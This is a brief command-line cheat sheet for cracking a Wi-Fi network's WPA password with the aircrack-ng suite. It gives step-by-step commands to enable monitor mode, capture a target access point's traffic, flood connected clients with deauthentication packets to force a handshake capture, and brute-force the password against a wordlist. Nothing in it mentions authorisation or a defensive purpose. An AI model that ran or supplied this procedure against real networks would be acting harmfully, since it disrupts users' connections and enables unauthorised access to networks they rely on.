### Wi-Fi recon with aircrack-ng

1. Put a wireless network card into _monitor_ mode

   start - turn on mode  
   stop - turn off  
   restart - turn on again

   **airmon-ng** **start|stop|restart** _INTERFACE_

   ```sh
   $ airmon-ng start wlo1
   ```

   Note. If airodump-ng, aireplay-ng, airtun-ng stops working - run `airmon-ng check kill`

2. Pick up information from all the wireless traffic of the APs nearby

   **airodump-ng** _RENAMED_WIFI_INTERFACE_

   ```sh
   $ airodump-ng wlo1mon
   ```

3. In the first terminal capture all the packages traversing the AP on channel

   **airodump-ng** **-c** _CHANNEL_ **--bssid** _AP_MAC_ADDRESS_ **-w** _FILE_TO_STORE_PSK_ _INTERFACE_IN_MONITOR_MODE_

   ```sh
   $ airodump-ng -c 10 --bssid 11:22:33:44:55 -w info-psk wlo1mon
   ```

4. In the second terminal knock off anyone connected to the AP and force them to reauthenticate to the AP.  
   The password hash will appear in the upper-right corner of the `airodump-ng` terminal

   **aireplay-ng** **--deauth** _COUNT_ **-a** _AP_MAC_ADDRESS_ **-c** _DESTINATION_MAC_ADDRESS_ _INTERFACE_IN_MONITOR_MODE_

   ```sh
   $ aireplay-ng --deauth 100 -a 11:22:33:44:55 -c 22:33:44:55:66 wlo1mon
   ```

5. In the final terminal use password list to find the password in the captured hash (file.cap)

   **aircrack-ng** **-w** _PASSWORD_LIST_FILE_ **-b** _AP_MAC_ADDRESS_ _INPUT_FILE_

   ```sh
   $ aircrack-ng -w wordlist.dic -b 11:22:33:44:55 info-psk.cap
   ```
